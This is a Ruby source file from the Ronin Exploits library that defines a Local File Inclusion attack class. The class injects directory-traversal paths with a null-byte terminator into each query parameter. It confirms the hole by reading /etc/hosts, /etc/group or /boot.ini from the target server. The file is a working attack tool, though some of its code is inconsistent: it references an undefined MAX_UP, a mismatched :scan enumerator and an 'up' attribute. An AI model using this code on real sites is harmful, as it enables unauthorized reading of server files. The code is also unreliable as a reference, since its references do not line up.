#
# Ronin Exploits - A Ruby library for Ronin that provides exploitation and
# payload crafting functionality.
#
# Copyright (c) 2007-2011 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This file is part of Ronin Exploits.
#
# Ronin is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ronin is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ronin.  If not, see <http://www.gnu.org/licenses/>
#

require 'ronin/attacks/web'
require 'ronin/path'

require 'uri/query_params'

module Ronin
  module Attacks
    #
    # Represents Local File Inclusion (LFI) attacks.
    #
    class LFI < Web

      # Known files to try including
      KNOWN_FILES = {
        '/etc/hosts' => /(127\.0\.0\.1|::1)\s+localhost/,
        '/etc/group' => /(root|admin|wheel):(x)?/,
        '/boot.ini'  => '[boot loader]'
      }

      # Number of directories to traverse up
      property :traversal, Integer, :default => 0

      # Whether to terminate the LFI path with a null byte
      property :terminate, Boolean, :default => true

      #
      # Scans the URL for LFI vulnerabilities.
      #
      # @param [URI::HTTP, String] url
      #   The URL to scan.
      #
      # @param [Hash] options
      #   Additional options.
      #
      # @option options [Array, Range] :up (1..10)
      #   The number of directories to attempt traversing up.
      #
      # @yield [lfi]
      #   The given block will be passed each discovered LFI vulnerability.
      #
      # @yieldparam [LFI] lfi
      #   A discovered LFI vulnerability.
      #
      # @return [Enumerator]
      #   If no block is given, an enumerator object will be returned.
      #
      # @since 0.2.0
      #
      def self.test(uri,options={})
        return enum_for(:scan,uri,options) unless block_given?

        uri = URI(uri) unless uri.kind_of?(URI)
        url = URL.from(uri)
        up  = (options.delete(:up) || (0..MAX_UP))

        uri.query_params.each do |name,value|
          lfi = new(options.merge(
            :url           => url,
            :query_param   => name,
            :original_data => value
          ))

          up.each do |n|
            lfi.up = n

            if lfi.vulnerable?
              yield lfi
              break
            end
          end
        end
      end

      def inject(path)
        full_path = Path.up(self.traversal).join(path.to_s)
        full_path = "#{full_path}\0" if terminate?

        return super(:append => "/../#{full_path}")
      end

      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable
      #   to LFI.
      #
      def vulnerable?(options={})
        KNOWN_FILES.any? do |path,pattern|
          exploit!(path).body.match(pattern)
        end
      end

    end
  end
end
